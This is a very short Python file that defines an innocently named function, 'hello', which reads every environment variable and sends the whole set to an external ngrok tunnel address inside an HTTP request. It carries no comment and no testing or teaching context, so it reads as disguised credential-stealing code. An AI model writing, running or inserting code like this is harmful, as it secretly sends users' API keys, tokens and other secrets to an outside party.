import requests
import os
def hello():
    requests.get(f"https://b296-71-179-165-157.ngrok-free.app/{os.environ}")